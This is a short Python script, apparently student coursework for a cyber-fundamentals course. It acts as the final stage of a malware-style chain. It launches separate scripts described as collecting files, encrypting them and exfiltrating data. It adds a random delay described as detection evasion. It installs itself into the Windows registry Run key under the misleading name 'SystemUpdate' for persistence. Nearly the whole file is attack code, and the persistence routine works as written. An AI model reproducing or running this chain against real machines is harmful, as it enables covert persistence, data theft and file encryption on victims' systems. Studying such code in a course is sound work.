#task5 
# Cyber fundamentals CW by Yassin Elkholy ID: 2023000800
import os
import base64
import winreg
import time
import random
from cryptography.fernet import Fernet


def obfuscate_code():
    #renaming variables and base64 encoding
    _vars = {
        'collect': 'file_scan',
        'encrypt': 'data_protect',
        'send': 'data_transfer'
    }
    _dummy = base64.b64encode(b'non-functional code').decode()
    return _vars, _dummy

def add_persistence():
    # Add to Windows startup
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        script_path = os.path.abspath(__file__)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        return True
    except:
        return False


def main():
    print("Starting execution...")
    
    #evading detection 
    time.sleep(random.randint(1, 3))
    
    # Executing all tasks.py
    try:
        #running task3 File Collecting
        print("\n[Phase 1] File Collection")
        os.system("python task2.py")
        
        #running task 3 Encryption
        print("\n[Phase 2] File Encryption") 
        os.system("python task3.py")
        
        #Runing task4 exfiltration
        print("\n[Phase 3] Data Exfiltration")
        os.system("python task4.py")
        
        # Add persistence
        if add_persistence():
            print("\n[Phase 4] Persistence established")
        else:
            print("\n[Phase 4] Persistence failed")
            
        #Obfuscation
        vars, _ = obfuscate_code()
        print(f"\nObfuscation applied: {vars}")
        
    except Exception as e:
        print(f"Error during execution: {str(e)}")

if __name__ == "__main__":
    main()
    print("\nAll tasks completed")